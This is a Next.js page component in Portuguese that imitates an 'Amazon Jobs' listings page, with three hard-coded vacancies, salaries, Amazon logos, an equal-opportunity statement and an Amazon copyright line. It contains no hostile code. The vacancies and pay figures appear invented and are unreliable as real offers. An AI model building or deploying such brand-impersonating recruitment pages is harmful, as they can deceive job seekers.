"use client";

import Image from "next/image";
import Link from "next/link";
import "./vagas.css";

export default function Vagas() {
  const vagas = [
    {
      id: 1,
      titulo: "Associado de Atendimento Remoto ao Cliente",
      tipo: "Período integral",
      duracao: "Por prazo indeterminado",
      salario: "R$ 2.268,00/mês",
      local: "Localização virtual",
      icone: "/Remote_Customer_Service_Associate_Icon._CB1678119780_.svg",
      link: "/BBJobDetails",
    },
    {
      id: 2,
      titulo: "Assistente de Logística – Centro de Distribuição",
      tipo: "Período integral",
      duracao: "Contrato de 6 meses",
      salario: "R$ 3.350,00/mês",
      local: "Presencial – Armazém Amazon",
      icone: "/2820578.png", // coloque um ícone representando logística
      link: "/LogisticsJobDetails",
    },
    {
      id: 3,
      titulo: "Operador de Estoque – Turno Noturno",
      tipo: "Meio período",
      duracao: "Contrato de 6 meses",
      salario: "R$ 4.100,00/mês",
      local: "Presencial – Armazém Amazon",
      icone: "/2820578.png", // ícone de estoque/armazém
      link: "/WarehouseJobDetails",
    },
  ];

  return (
    <main className="min-h-screen bg-white text-gray-900">
      <header>
        <div className="navbar">
          {/* LOGO */}
          <div className="navbar-left">
            <Image
              src="/logo_dark.99265b07.svg"
              alt="Amazon Jobs"
              width={120}
              height={36}
              priority
            />
          </div>

          {/* LINKS CENTRALIZADOS */}
          <nav className="navbar-center">
            <a href="#como-funciona">Oportunidades de Emprego</a>
            <a href="#faq">Pesquisar todas as vagas</a>
            <a href="#">Começando</a>
            <a href="#">Minha conta</a>
          </nav>
        </div>
      </header>

      {/* TOPO */}
      <div className="vagas-top">
        <h2>{vagas.length} vagas de emprego encontradas</h2>
      </div>

      {/* LISTA DE VAGAS */}
      <div className="vagas-lista">
        {vagas.map((vaga) => (
          <Link href={vaga.link} key={vaga.id} className="vaga-card">
            <div className="vaga-img">
              <Image
                src={vaga.icone}
                alt={`Ícone ${vaga.titulo}`}
                width={98}
                height={98}
              />
            </div>
            <div className="vaga-info">
              <h3>{vaga.titulo}</h3>
              <p>
                <strong>Tipo:</strong> {vaga.tipo}
              </p>
              <p>
                <strong>Duração:</strong> {vaga.duracao}
              </p>
              <p>
                <strong>Salário:</strong> {vaga.salario}
              </p>
              <p>
                <span className="vaga-local">{vaga.local}</span>
              </p>
            </div>
          </Link>
        ))}
      </div>

      {/* PAGINAÇÃO */}
      <div className="vagas-paginacao">
        <button className="pagina-ativa">1</button>
      </div>

      {/* FOOTER */}
      <footer className="footer">
        <div className="footer-social">
          <h4>Junte-se a nós agora</h4>
          <a href="#" aria-label="Facebook" className="social-link">
            <svg
              width="22"
              height="22"
              viewBox="0 0 448 512"
              fill="currentColor"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path d="M400 32H48A48 48 0 0 0 0 80v352a48 48 0 0 0 48 48h137.25V327.69h-63V256h63v-54.64c0-62.15 
              37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.27c-30.81 0-40.42 19.12-40.42 
              38.73V256h68.78l-11 71.69h-57.78V480H400a48 48 0 0 0 48-48V80a48 48 0 0 0-48-48z"/>
            </svg>
          </a>
        </div>

        <div className="footer-top">
          <div className="footer-col">
            <h4>OPORTUNIDADES DE EMPREGO</h4>
            <ul>
              <li><a href="#">Oportunidades em Centros de Distribuição e Estações de Entrega</a></li>
              <li><a href="#">Empregos de atendimento ao cliente</a></li>
              <li><a href="#">Procura de emprego</a></li>
            </ul>
          </div>

          <div className="footer-col">
            <h4>RECURSOS</h4>
            <ul>
              <li><a href="#">Perguntas Frequentes</a></li>
              <li><a href="#">Fale Conosco</a></li>
            </ul>
          </div>

          <div className="footer-logo">
            <Image
              src="/logo.92a0feec.svg"
              alt="Amazon Jobs"
              width={140}
              height={40}
            />
          </div>
        </div>

        <div className="footer-bottom">
          <p className="descricao">
            A Amazon está comprometida com um ambiente de trabalho diversificado e inclusivo.  
            A Amazon é uma empregadora que oferece oportunidades iguais e não discrimina com base em raça, nacionalidade, sexo, identidade de gênero, orientação sexual, deficiência, idade ou outro status legalmente protegido.
          </p>

          <div className="footer-legal">
            <a href="#">Aviso de privacidade</a>
            <span>© 1996–2025 Amazon.com, Inc. ou suas afiliadas</span>
          </div>
        </div>
      </footer>
    </main>
  );
}
